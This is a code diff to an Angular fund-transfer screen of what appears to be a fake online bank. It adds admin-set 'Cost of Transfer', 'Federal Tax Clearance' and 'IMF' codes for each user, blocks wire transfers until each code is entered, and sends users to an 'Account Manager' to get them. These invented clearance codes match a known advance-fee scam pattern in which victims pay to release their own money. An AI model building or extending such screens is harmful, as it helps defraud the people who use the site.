@@ -371,32 +371,47 @@ import { Beneficiary } from '../../../../core/models/bank.models';
             </div>
 
             <p class="text-[11px] text-slate-500 leading-relaxed">
-              Your account is authenticated under sovereign banking compliance. Cross-border disbursements validate against your registered clearance tokens:
+              Your account is authenticated under sovereign banking compliance. Outward wire dispatches validate against statutory clearance tokens:
             </p>
 
             <div class="space-y-2">
               <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-200/80 flex items-center justify-between text-xs">
                 <div>
-                  <div class="text-[10px] font-bold text-slate-500 uppercase">COT Code (Cost of Transfer)</div>
-                  <div class="font-mono font-bold text-[#003432]">{{ cotCode }}</div>
+                  <div class="text-[10px] font-bold text-slate-500 uppercase">Cost of Transfer (COT) Code</div>
+                  <div class="text-[11px] font-bold" [ngClass]="cotRequired() ? 'text-amber-800' : 'text-slate-600'">
+                    {{ cotRequired() ? 'Statutory Code Required' : 'Waived / Exempt' }}
+                  </div>
                 </div>
-                <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">Verified ✓</span>
+                <span class="text-[10px] font-bold px-2 py-0.5 rounded border"
+                      [ngClass]="cotRequired() ? 'text-amber-700 bg-amber-50 border-amber-300' : 'text-emerald-700 bg-emerald-50 border-emerald-200'">
+                  {{ cotRequired() ? 'Required ⚠️' : 'Exempt ✓' }}
+                </span>
               </div>
 
               <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-200/80 flex items-center justify-between text-xs">
                 <div>
-                  <div class="text-[10px] font-bold text-slate-500 uppercase">Federal Tax Clearance</div>
-                  <div class="font-mono font-bold text-[#003432]">{{ taxCode }}</div>
+                  <div class="text-[10px] font-bold text-slate-500 uppercase">Federal Tax Clearance (TCC)</div>
+                  <div class="text-[11px] font-bold" [ngClass]="taxRequired() ? 'text-amber-800' : 'text-slate-600'">
+                    {{ taxRequired() ? 'Statutory Code Required' : 'Waived / Exempt' }}
+                  </div>
                 </div>
-                <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">Verified ✓</span>
+                <span class="text-[10px] font-bold px-2 py-0.5 rounded border"
+                      [ngClass]="taxRequired() ? 'text-amber-700 bg-amber-50 border-amber-300' : 'text-emerald-700 bg-emerald-50 border-emerald-200'">
+                  {{ taxRequired() ? 'Required ⚠️' : 'Exempt ✓' }}
+                </span>
               </div>
 
               <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-200/80 flex items-center justify-between text-xs">
                 <div>
                   <div class="text-[10px] font-bold text-slate-500 uppercase">IMF Anti-Money Laundering</div>
-                  <div class="font-mono font-bold text-[#003432]">{{ imfCode }}</div>
+                  <div class="text-[11px] font-bold" [ngClass]="imfRequired() ? 'text-amber-800' : 'text-slate-600'">
+                    {{ imfRequired() ? 'Statutory Code Required' : 'Waived / Exempt' }}
+                  </div>
                 </div>
-                <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">Verified ✓</span>
+                <span class="text-[10px] font-bold px-2 py-0.5 rounded border"
+                      [ngClass]="imfRequired() ? 'text-amber-700 bg-amber-50 border-amber-300' : 'text-emerald-700 bg-emerald-50 border-emerald-200'">
+                  {{ imfRequired() ? 'Required ⚠️' : 'Exempt ✓' }}
+                </span>
               </div>
             </div>
           </div>
@@ -432,40 +447,40 @@ import { Beneficiary } from '../../../../core/models/bank.models';
 
       </div>
 
-      <!-- Multi-Stage Clearance Authorization Modal (Mobile-Safe Height & Padding) -->
+      <!-- Multi-Stage Clearance Authorization Modal (Enforcing Admin Toggled Codes) -->
       @if (showClearanceModal()) {
-        <div class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/50 backdrop-blur-xs animate-fade-in">
+        <div class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/50 backdrop-blur-xs animate-fade-in font-sans">
           <div class="bg-white rounded-3xl max-w-md w-full border border-slate-200 shadow-2xl p-5 sm:p-7 space-y-5 max-h-[90vh] overflow-y-auto">
             
             <div class="flex items-center justify-between pb-3 border-b border-slate-100">
               <div>
                 <span class="text-[10px] font-extrabold uppercase tracking-wider text-[#0BB4D2] bg-teal-50 px-2 py-0.5 rounded border border-teal-200/80">
-                  Clearance Stage {{ clearanceStep() }} of 3
+                  Clearance Stage {{ queueIndex() + 1 }} of {{ activeQueue().length }}
                 </span>
                 <h3 class="text-base font-black text-slate-900 mt-1">
-                  @if (clearanceStep() === 1) { Cost of Transfer (COT) Clearance }
-                  @else if (clearanceStep() === 2) { Federal Tax Compliance Code }
+                  @if (currentQueueCodeType() === 'COT') { Cost of Transfer (COT) Clearance }
+                  @else if (currentQueueCodeType() === 'TAX') { Federal Tax Compliance Clearance }
                   @else { IMF / Anti-Money Laundering Protocol }
                 </h3>
               </div>
-              <button (click)="showClearanceModal.set(false)" class="text-slate-400 hover:text-slate-700 text-2xl font-bold leading-none">&times;</button>
+              <button (click)="showClearanceModal.set(false)" class="text-slate-400 hover:text-slate-700 text-2xl font-bold leading-none cursor-pointer">&times;</button>
             </div>
 
             <div class="space-y-4 text-xs">
               <p class="text-slate-600 leading-relaxed">
-                @if (clearanceStep() === 1) {
-                  This wire transfer requires validation with your assigned Cost of Transfer (COT) clearing token before ledger finality.
-                } @else if (clearanceStep() === 2) {
+                @if (currentQueueCodeType() === 'COT') {
+                  This wire transfer requires authorization with your assigned Cost of Transfer (COT) clearing token before ledger finality.
+                } @else if (currentQueueCodeType() === 'TAX') {
                   Enter your assigned Federal Tax Clearance code to release outward capital reserves.
                 } @else {
-                  Enter the final International Monetary Fund (IMF) clearing code to complete dispatch.
+                  Enter your International Monetary Fund (IMF) cross-border protocol clearing code to complete dispatch.
                 }
               </p>
 
               <div>
                 <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
-                  @if (clearanceStep() === 1) { Cost of Transfer (COT) Authorization Code * }
-                  @else if (clearanceStep() === 2) { Statutory Tax Clearance Code * }
+                  @if (currentQueueCodeType() === 'COT') { Cost of Transfer (COT) Authorization Code * }
+                  @else if (currentQueueCodeType() === 'TAX') { Statutory Tax Clearance Code * }
                   @else { IMF Cross-Border Protocol Code * }
                 </label>
                 <input type="text" [(ngModel)]="inputCode" 
@@ -475,13 +490,21 @@ import { Beneficiary } from '../../../../core/models/bank.models';
                   Enter the mandatory clearance code provided by the Compliance &amp; Settlement Desk.
                 </span>
               </div>
+
+              <!-- Assistance Note -->
+              <div class="p-3 bg-teal-50/70 border border-teal-100 rounded-xl text-[11px] text-[#003432] space-y-1">
+                <strong>Need your authorization code?</strong>
+                <p class="text-slate-600">
+                  If you have not received this code, please contact your Account Manager or our Treasury Support Desk.
+                </p>
+              </div>
             </div>
 
             <div class="flex items-center justify-end gap-3 pt-2 border-t border-slate-100">
-              <button (click)="showClearanceModal.set(false)" class="px-4 py-2 rounded-xl bg-slate-100 text-xs font-bold text-slate-600 hover:bg-slate-200 transition">
+              <button (click)="showClearanceModal.set(false)" class="px-4 py-2 rounded-xl bg-slate-100 text-xs font-bold text-slate-600 hover:bg-slate-200 transition cursor-pointer">
                 Cancel
               </button>
-              <button (click)="submitClearanceStep()" class="bg-[#003432] hover:bg-[#002625] text-white px-5 py-2 rounded-xl text-xs font-bold shadow-xs transition">
+              <button (click)="submitClearanceStep()" class="bg-[#003432] hover:bg-[#002625] text-white px-5 py-2 rounded-xl text-xs font-bold shadow-xs transition cursor-pointer">
                 Verify &amp; Continue &rarr;
               </button>
             </div>
@@ -507,14 +530,27 @@ export class FundTransferComponent implements OnInit {
   // Saved beneficiaries
   savedBeneficiaries = signal<Beneficiary[]>([]);
 
-  // Multi-stage clearance simulation
-  showClearanceModal = signal<boolean>(false);
-  clearanceStep = signal<number>(1);
-  inputCode: string = '';
+  // Dynamic Clearance Requirements (configured by Admin)
+  cotRequired = signal<boolean>(false);
+  taxRequired = signal<boolean>(false);
+  imfRequired = signal<boolean>(false);
   cotCode: string = 'COT-7749';
   taxCode: string = 'TAX-8821';
   imfCode: string = 'IMF-9904';
   accountStatus: string = 'ACTIVE';
+
+  // Clearance Modal Queue State
+  showClearanceModal = signal<boolean>(false);
+  activeQueue = signal<Array<'COT' | 'TAX' | 'IMF'>>([]);
+  queueIndex = signal<number>(0);
+  inputCode: string = '';
+  collectedCodes = { cotCode: '', taxCode: '', imfCode: '' };
+
+  currentQueueCodeType(): 'COT' | 'TAX' | 'IMF' | null {
+    const q = this.activeQueue();
+    const idx = this.queueIndex();
+    return q[idx] || null;
+  }
 
   form = {
     type: 'DT',
@@ -547,6 +583,9 @@ export class FundTransferComponent implements OnInit {
           this.cotCode = res.data.account.cotCode || 'COT-7749';
           this.taxCode = res.data.account.taxCode || 'TAX-8821';
           this.imfCode = res.data.account.imfCode || 'IMF-9904';
+          this.cotRequired.set(!!res.data.account.cotRequired);
+          this.taxRequired.set(!!res.data.account.taxRequired);
+          this.imfRequired.set(!!res.data.account.imfRequired);
           this.accountStatus = res.data.account.status || 'ACTIVE';
         }
       }
@@ -603,14 +642,31 @@ export class FundTransferComponent implements OnInit {
       return;
     }
 
-    // Trigger multi-stage clearance code challenge
-    this.clearanceStep.set(1);
+    // Build list of clearance codes toggled ON by admin for this user
+    const q: Array<'COT' | 'TAX' | 'IMF'> = [];
+    if (this.cotRequired()) q.push('COT');
+    if (this.taxRequired()) q.push('TAX');
+    if (this.imfRequired()) q.push('IMF');
+
+    this.activeQueue.set(q);
+    this.queueIndex.set(0);
+    this.collectedCodes = { cotCode: '', taxCode: '', imfCode: '' };
     this.inputCode = '';
+
+    // If no clearance codes are enforced by admin, execute transfer immediately
+    if (q.length === 0) {
+      this.executeWireTransfer();
+      return;
+    }
+
+    // Otherwise prompt for each required code in sequence
     this.showClearanceModal.set(true);
   }
 
   submitClearanceStep() {
-    const step = this.clearanceStep();
+    const q = this.activeQueue();
+    const idx = this.queueIndex();
+    const currentType = q[idx];
     const entered = (this.inputCode || '').trim();
 
     if (!entered) {
@@ -618,25 +674,43 @@ export class FundTransferComponent implements OnInit {
       return;
     }
 
-    if (step === 1) {
+    if (currentType === 'COT') {
       if (entered.toUpperCase() !== (this.cotCode || '').toUpperCase()) {
-        this.modalService.alert({ title: 'Invalid COT Code', message: 'The Cost of Transfer (COT) authorization code is invalid. Please contact the compliance desk.', type: 'danger' });
+        this.modalService.alert({ 
+          title: 'Invalid COT Code', 
+          message: 'The Cost of Transfer (COT) authorization code entered is invalid. Please contact the Compliance & Settlement Desk to obtain your valid clearance code.', 
+          type: 'danger' 
+        });
         return;
       }
-      this.clearanceStep.set(2);
-      this.inputCode = '';
-    } else if (step === 2) {
+      this.collectedCodes.cotCode = entered;
+    } else if (currentType === 'TAX') {
       if (entered.toUpperCase() !== (this.taxCode || '').toUpperCase()) {
-        this.modalService.alert({ title: 'Invalid Tax Clearance Code', message: 'The Tax Clearance authorization code is invalid. Please contact the compliance desk.', type: 'danger' });
+        this.modalService.alert({ 
+          title: 'Invalid Tax Clearance Code', 
+          message: 'The Tax Clearance Certificate code entered is invalid. Please contact the Treasury Compliance Desk to obtain your valid clearance code.', 
+          type: 'danger' 
+        });
         return;
       }
-      this.clearanceStep.set(3);
+      this.collectedCodes.taxCode = entered;
+    } else if (currentType === 'IMF') {
+      if (entered.toUpperCase() !== (this.imfCode || '').toUpperCase()) {
+        this.modalService.alert({ 
+          title: 'Invalid IMF Code', 
+          message: 'The International Monetary Fund (IMF) cross-border protocol code entered is invalid. Please contact the Compliance Desk to obtain your valid clearance code.', 
+          type: 'danger' 
+        });
+        return;
+      }
+      this.collectedCodes.imfCode = entered;
+    }
+
+    // Advance queue or complete
+    if (idx + 1 < q.length) {
+      this.queueIndex.update(i => i + 1);
       this.inputCode = '';
     } else {
-      if (entered.toUpperCase() !== (this.imfCode || '').toUpperCase()) {
-        this.modalService.alert({ title: 'Invalid IMF Code', message: 'The International Monetary Fund (IMF) cross-border protocol code is invalid. Please contact the compliance desk.', type: 'danger' });
-        return;
-      }
       this.showClearanceModal.set(false);
       this.executeWireTransfer();
     }
@@ -653,7 +727,10 @@ export class FundTransferComponent implements OnInit {
       type: this.form.type as any,
       amt: this.form.amt!,
       comment: this.form.comment,
-      saveBeneficiary: this.form.saveBeneficiary
+      saveBeneficiary: this.form.saveBeneficiary,
+      cotCode: this.collectedCodes.cotCode,
+      taxCode: this.collectedCodes.taxCode,
+      imfCode: this.collectedCodes.imfCode
     }).subscribe({
       next: (res) => {
         this.isSubmitting = false;
